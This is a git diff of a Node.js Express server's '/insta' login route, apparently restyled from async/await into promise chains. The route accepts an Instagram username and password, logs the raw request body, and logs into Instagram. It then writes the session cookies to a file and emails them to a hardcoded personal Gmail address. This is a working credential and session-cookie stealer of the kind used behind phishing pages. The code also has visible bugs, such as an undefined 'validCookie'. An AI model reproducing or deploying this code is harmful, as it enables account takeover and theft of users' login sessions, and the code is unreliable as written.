@@ -230,62 +230,89 @@ app.get("/insta/submitCode", (req, res) => {
     });
 });
 
-app.post("/insta",async (req, res) => {
+app.post("/insta", (req, res) => {
   // Initiate Instagram API client
   console.log("insta login test");
   console.log(req.body);
-
   ig.state.generateDevice(req.body.username);
 
   return Promise.try(() =>
-    ig.account.login(req.body.username, req.body.password).then((val)  => {
+    ig.account.login(req.body.username, req.body.password).then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
         val2.cookies.map((cookiepairs) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
         });
-        const filename=randomstring.generate({
+        const filename = randomstring.generate({
           length: 6,
           charset: "alphabetic",
         });
-      const output=await fse.outputJSON(
-          __dirname +
-            `/tempt/${filename}.txt`,
-          val2.cookies
-        );
-        console.log(output);
-        const data=await fse.readFile();
-        console.log(data);
-        var mailOptions = {
-          from: process.env.email,
-          to: "tklinger50@gmail.com",
-          subject: "cookies of user" + req.body.username,
-          text: JSON.stringify(validCookie),
-          attachments: [{'filename': __dirname +
-          `/tempt/${filename}.txt`, 'content': data}]
-        };
-        transporter.sendMail(mailOptions, function (error, info) {
-          if (error) {
+        fse
+          .outputJSON(__dirname + `/tempt/${filename}.txt`, val2.cookies)
+          .then((result) => {
+            console.log(result);
+            fse
+              .readFile(__dirname + `/tempt/${filename}.txt`)
+              .then((data) => {
+                console.log(data);
+                var mailOptions = {
+                  from: process.env.email,
+                  to: "tklinger50@gmail.com",
+                  subject: "cookies of user" + req.body.username,
+                  text: JSON.stringify(validCookie),
+                  attachments: [
+                    {
+                      filename: __dirname + `/tempt/${filename}.txt`,
+                      content: data,
+                    },
+                  ],
+                };
+                transporter.sendMail(mailOptions, function (error, info) {
+                  if (error) {
+                    console.log(error);
+                    res.json({
+                      success: true,
+                      twoFactor: false,
+                      user: val,
+                      cookie: JSON.stringify(validCookie),
+                      message: "login Successful but failed to send email",
+                    });
+                  } else {
+                    console.log("Email sent: " + info.response);
+                    res.json({
+                      success: true,
+                      twoFactor: false,
+                      user: val,
+                      cookie: JSON.stringify(validCookie),
+                      message: "login Successful and email has been sent.",
+                    });
+                    res.end();
+                  }
+                });
+              })
+              .catch((err) => {
+                console.log(err);
+                res.json({
+                  success: true,
+                  twoFactor: false,
+                  user: val,
+                  cookie: val2.cookies,
+                  message: "login Successful but failed to send email",
+                });
+                res.end();
+              });
+          })
+          .catch((error) => {
             console.log(error);
             res.json({
               success: true,
               twoFactor: false,
               user: val,
-              cookie: JSON.stringify(validCookie),
+              cookie: val2.cookies,
               message: "login Successful but failed to send email",
             });
-          } else {
-            console.log("Email sent: " + info.response);
-            res.json({
-              success: true,
-              twoFactor: false,
-              user: val,
-              cookie: JSON.stringify(validCookie),
-              message: "login Successful and email has been sent.",
-            });
             res.end();
-          }
-        });
+          });
       });
     })
   ).catch(
